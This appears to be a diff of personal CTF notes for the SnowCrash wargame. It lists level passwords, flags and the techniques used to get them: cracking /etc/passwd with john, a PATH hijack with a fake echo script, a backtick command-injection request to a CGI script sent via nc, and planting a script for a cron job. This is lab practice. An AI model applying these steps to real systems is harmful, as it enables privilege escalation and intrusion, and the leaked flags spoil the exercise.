@@ -1,6 +1,9 @@
-copy files
-	"7z x -oSnowCrash SnowCrash.iso"
-	http://www.octetmalin.net/linux/tutoriels/ubuntu-personnaliser-live-cd-usb.php
+0 - Search for writable/readable files (find / -writable(-readable) -type d(f) 2>/dev/null)
+1 - List users (cat /etc/passwd)
+2 - Find target
+3 - Get ids (id target)
+4 - Find files from target (find -user flag00 -type f 2>/dev/null)
+5 - Crach passwd file with john
 
 method to search:
 	grep -d recurse [SEARCH] . 2>/dev/null | cut -d":" -f 1 | sort | uniq
@@ -13,10 +16,7 @@ method for executables:
 	ltrace
 
 
-
-
 level00 -> level00
-	vim ./root/.bash_history
 	find / -user flag00 2>/dev/null
 	cat /usr/sbin/john
 		search for "sbin john" -> john the ripper ?
@@ -24,40 +24,73 @@ level00 -> level00
 	flag00 -> nottoohardhere (caesar +15)
 
 level01 -> x24ti5gi3x0ol2eh4esiuxias
-	unshadow /etc/passwd /etc/shadow > mypasswd
-	john mypasswd
+	scp passwd herrfalco@192.168.1.86:~/SnowCrash
+	john passwd --show
 
 	flag01 -> abcdefg
 
 level02 -> f2av5il02puano7naaf6adaaf
+	scp level02.pcap herrfalco@192.168.1.86:~/SnowCrash
 	tcpick -C -yP -r level02.pcap
-	grep -d recurse "ft_wa"
-	root/.bash_history:echo "flag02:ft_waNDReL0L" | chpasswd
 
 	flag02 -> ft_waNDReL0L (zero inside)
 
 level03 -> kooda2puivaav1idi4f57q8iq
 	try level03
-	strings level03 -> /usr/bin/env echo Exploit me
+	permissions s created by flag03
 	ltrace level03 -> permissions -> echo substitute to getflag
 	find . -writable -type d 2>/dev/null
-	vim /tmp/echo -> "#!/bin/bash
-	getflag"
 	export PATH=/tmp:$PATH
+	vim echo -> "#!/bin/bash
+		getflag"
+	chmod 777 echo
+	scp -P 4242 echo level03@192.168.1.25:/tmp
 	
 	flag03 -> X
 
 level04 -> qi0maab88jeaj46qoumi7maus
+	permissions s created by flag04
+	cat level04.pl -> CGI -> Server ?
+	search in /etc find apache2
+	cat /etc/apache2/sites-enabled -> :4747
+	>
+	"DocumentRoot    /var/www/level04/"
+	SuexecUserGroup flag04 level04
+	DirectoryIndex level04.pl
+	<
+	create cgi_request :
+	>
+	GET /?x=`getflag` HTTP/1.1
+	Host: nobody
+	
+	<
+	nc 192.168.1.25 4747 < cgi_request
 
 	flag04 -> X
 
 level05 -> ne2searoevaevoem4ov4ar8ap
-	
+	new mail ?
+	find / -name mail 2>/dev/null
+	cat /var/mail/level05
+	>
+	*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+	<
+	cat /usr/sbin/openarenaserver
+	create cront_tab
+	>
+	getflag > /tmp/result
+	<
+	scp -P 4242 ./cron_tab level05@192.168.1.25:/opt/openarenaserver/
+	chmod 777 cron_tab
+	wait until it disapear
+	cat /tmp/result
 
+	flag05 -> X
+
+level06 -> viuaaale9huek52boumoomioc
+	
 in gdb
 	break system
 	x/1s 0x080485e0
-
-
 
 mkisofs -o SnowCrash_mod.iso -b isolinux/isolinux.bin -c isolinux/boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table -J -R -V "Custom SnowCrash Iso" ../SnowCrash
